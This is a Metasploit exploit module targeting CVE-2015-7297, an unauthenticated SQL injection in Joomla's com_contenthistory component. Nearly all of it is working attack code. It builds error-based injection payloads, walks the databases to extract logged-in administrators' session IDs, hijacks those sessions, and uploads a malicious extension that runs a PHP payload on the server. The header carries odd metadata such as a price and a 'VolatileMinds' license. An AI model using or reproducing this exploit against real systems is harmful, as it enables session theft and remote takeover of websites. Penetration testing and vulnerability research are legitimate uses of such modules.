##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Joomla com_contenthistory Error-based SQL Injection Remote Code Execution',
      'Description' => %q{
    This module exploits an error-based SQL injection vulnerability.

      This module attempts to exploit an unauthenticated error-based SQL injection in order
      to enumerate the current authenticated HTTP session IDs in the database and attempt
      to upload a malicious Joomla! extension in the administration panel.

      Categories: Joomla, SQL Injection

      Price: 1

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'Author' =>
        [
          'Asaf Orpani', #discovery
          'bperry' #metasploit module
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
          ['CVE', '2015-7297'],
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 22 2015'))

    register_options(
      [
         OptString.new('TARGETURI', [true, "Base Joomla! directory path", '/']),
      ], self.class)
  end

  def check
    flag = Rex::Text.rand_text_alpha(8)
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    payload = "AND (SELECT 8146 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT 0x#{flag.unpack("H*")[0]}),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    res = sqli(payload)

    if res and res.body =~ /#{left_marker}#{flag}#{right_marker}/
      return Msf::Exploit::CheckCode::Vulnerable
    end

    return Msf::Exploit::CheckCode::Safe
  end

  def exploit
    if check == Msf::Exploit::CheckCode::Safe
      print_error("Check returns not vulnerable.")
      return
    end

    res = get_cookie
    cookies = res.get_cookies
    cookie_name = cookies.split('=')[0]

    vprint_status("Cookie name: " + cookie_name)

    get_session_ids.each do |session|

      vprint_status("Attempting to use session ID " + session)
      full_cookie = cookie_name + '=' + session
      name = upload_component(full_cookie)

      send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'vars_get' => {
          'option' => 'com_' + name
        }
      })
    end
  end

  def get_session_ids
    sids = []
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    db_count = "AND (SELECT 7049 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    res = sqli(db_count)

    res.body =~ /#{left_marker}(.*)#{right_marker}/

    db_count = $1.to_i

    dbs = []
    0.upto(db_count-1) do |i|
      get_db = "AND (SELECT 9145 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
      res = sqli(get_db)
      dbs << $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    dbs.delete('information_schema')
    dbs.delete('performance_schema')
    dbs.delete('mysql')

    dbs.each do |db|
      table_count = "AND (SELECT 4017 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
      res = sqli(table_count)

      res.body =~ /#{left_marker}(.*)#{right_marker}/

      table_count = $1.to_i

      tables = []
      0.upto(table_count - 1) do |i|
        get_table = "AND (SELECT 2885 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        res = sqli(get_table)
        res.body =~ /#{left_marker}(.*)#{right_marker}/
        table = $1
        tables << table if table =~ /_session$/
      end

      tables.each do |table|
        get_session_count = "AND (SELECT 5206 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(count(*) AS CHAR),0x20)),1,54) FROM #{db}.#{table} WHERE username <> ''),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        res = sqli(get_session_count)
        res.body =~ /#{left_marker}(.*)#{right_marker}/

        session_count = $1.to_i

        0.upto(session_count-1) do |i|
          get_sid = "AND (SELECT 3269 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(session_id AS CHAR),0x20)),1,54) FROM #{db}.#{table} WHERE username <> '' LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
          res = sqli(get_sid)
          res.body =~ /#{left_marker}(.*)#{right_marker}/
          sids << $1
        end
      end
    end

    return sids
  end

  def get_security_token(session)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'administrator', 'index.php'),
      'vars_get' => {
        'option' => 'com_installer'
      },
      'cookie' => session
    })
  end

  def upload_component(session)
    token = get_security_token(session)

    token.body =~ /logout&amp;(.*)=1/
    token = $1

    name, component = create_component_zip
    post_data = Rex::MIME::Message.new

    post_data.add_part(component.pack, "application/zip", 'binary', 'form-data; name="install_package"; filename="'+name+'.zip"')
    post_data.add_part('upload', nil, nil, 'form-data; name="installtype"')
    post_data.add_part('install.install', nil, nil, 'form-data; name="task"')
    post_data.add_part('1', nil, nil, 'form-data; name="'+token+'"')
    post_data.add_part('/var/www/html/tmp', nil, nil, 'form-data; name="install_directory";')
    post_data.add_part('http://', nil, nil, 'form-data; name="install_url";')
    post_data.add_part('', nil, nil, 'form-data; name="type";')

    data = post_data.to_s

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'administrator', 'index.php'),
      'vars_get' => {
        'option' => 'com_installer',
        'view' => 'install'
      },
      'data' => data,
      'ctype' => 'multipart/form-data; boundary='+post_data.bound,
      'cookie' => session
    })

    return name
  end

  def get_cookie
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'administrator', 'index.php')
    })
  end

  def create_component_zip
    name = Rex::Text.rand_text_alpha(8).downcase
    zip = Rex::Zip::Archive.new
    zip.add_file(name + '.xml', get_xml(name))
    zip.add_file(name + '.php', get_payload)

    return name, zip
  end

  def get_xml(name)
    %Q{<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="2.5" method="upgrade">
<name>#{name}</name>
<author>#{Rex::Text.rand_text_alpha(9)}</author>
<creationDate>2012-11-12</creationDate>
<copyright></copyright>
<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
<version>1.0</version>
<description></description>
<files>
<filename>#{name}.php</filename>
<filename>#{name}.xml</filename>
</files>
<administration />
</extension>
    }
  end

  def get_payload
    return '<?php ' + payload.encoded + ' ?>'
  end

  def sqli(payload)
    return send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'index.php'),
          'vars_get' => {
            'option' => 'com_contenthistory',
            'view' => 'history',
            'list[ordering]' => '',
            'item_id' => 1,
            'type_id' => 1,
            'list[select]' => "1 " + payload
          }
    })
  end

end

